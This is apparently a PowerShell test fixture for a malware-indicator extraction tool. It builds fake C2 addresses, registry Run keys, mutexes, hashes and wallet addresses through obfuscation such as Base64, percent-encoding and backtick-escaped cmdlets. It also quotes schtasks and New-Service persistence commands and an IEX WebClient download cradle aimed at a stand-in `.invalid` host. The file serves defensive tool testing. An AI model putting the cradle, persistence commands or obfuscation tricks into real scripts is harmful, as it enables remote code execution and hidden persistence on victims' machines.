# PlaguardsV2 example script (inert demo, safe to analyze)
#
# Static test data for the whole pipeline. It carries one of every indicator
# class the extractor knows, exercises the deobfuscation passes, and includes
# two real public addresses so the report's geolocation section has something
# to resolve rather than sitting empty.
#
# Safety, deliberately:
#   * Every hostile-looking indicator is non-routable - RFC 2606 `.invalid`
#     names, RFC 5737 documentation IPv4, RFC 3849 documentation IPv6.
#   * The only real addresses are public DNS resolvers, and they appear in the
#     connectivity-check role they genuinely serve - not as C2. Geolocation
#     needs a routable address to have anything to say.
#   * The digests are the well-known hashes of an empty file, and the wallets
#     are the Bitcoin genesis address and an obviously synthetic one.
# Nothing here is ever executed - PlaguardsV2 only reads it.

# --- staging: the address is assembled, never written out -------------------
$four = [char](50 + 2); $port = $four + $four + $four + $four
$dom = "example.invalid"; $dom = "malicious." + $dom
$c2 = "http://" + $dom + "/payload.ps1"
$ip = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("MTk4LjUxLjEwMC40Mg=="))

# percent-encoding: valid in a URL, and hides every recognisable character
$fallback = [uri]::UnescapeDataString("%32%30%33%2E%30%2E%31%31%33%2E%39")

# a Base64 run broken across lines - .NET ignores the whitespace
$note = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(@'
c3RhZ2UtdHdvIGRyb3Ag
cGF0aA==
'@))

# --- host artefacts ---------------------------------------------------------
$run = "HKCU__Software__Microsoft__Windows__CurrentVersion__Run" -replace "__", "\"
$mtx = "Global\" + (("ABAD", "IDEA", "123") -join "-")
$drop = "C:\ProgramData\Updater\stage.bin"
$share = "\\fileserver.example.invalid\drop"
$task = "UpdaterTask"
$svc = "UpdaterSvc"

# --- sample identity --------------------------------------------------------
$md5 = "d41d8cd98f00b204e9800998ecf8427e"
$sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
$sha256 = ("e3b0c44298fc1c149afbf4c8,996fb92427ae41e4649b,934ca495991b7852b855" -split ",") -join ""
# A partial hash of a different file (the SHA-256 test vector for "abc"):
# a prefix of a digest already listed above would add nothing.
$hpref = "ba7816bf8f01cfea"

# --- operator contact and payout addresses ---------------------------------
$mail = "operator" + "@" + "example" + ".invalid"
$btc = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
$eth = "0xdEaD00000000000000000000000000000000BEEF"

# --- network identity -------------------------------------------------------
$ua = "Mozilla/5.0 (Windows NT 10.0) " + "EVIL" + "BOT/1.0"
$v6 = "[2001:db8:85a3::8a2e:370:7334]:8443"
$mkr = [Text.Encoding]::ASCII.GetString([byte[]](77, 85, 84, 69, 88))
$endpoint = "{0}:{1}" -f "198.51.100.42", "4444"

# Public resolvers, used the way a loader actually uses them: a reachability
# probe before anything else. These are the only routable addresses here.
$dns1 = "8.8.8.8"
$dns2 = "1.1.1.1"

# --- persistence and delivery, quoted rather than run -----------------------
$persist = "schtasks /Create /TN " + '"' + $task + '"' + " /TR " + '"' + $drop + '"'
$service = "New-Service -Name " + '"' + $svc + '"' + " -BinaryPathName " + '"' + $drop + '"'
$cradle = "IEX (New-Object Net.WebClient).DownloadString('" + $c2 + "')"

W`r`i`te-H`o`st @"
MARKER=$mkr
C2=$c2
IP=$ip`:$port
ENDPOINT=$endpoint
FALLBACK=$fallback
IPV6=$v6
NOTE=$note
UA=$ua
RUN=$run
MUTEX=$mtx
DROP=$drop
SHARE=$share
TASK=$task
SERVICE=$svc
MD5=$md5
SHA1=$sha1
SHA256=$sha256
SHA256pre=$hpref
MAIL=$mail
BTC=$btc
ETH=$eth
DNSCHECK=$dns1 $dns2
PERSIST[inert,not executed]=$persist
SERVICECMD[inert,not executed]=$service
CRADLE[inert,not executed]=$cradle
"@
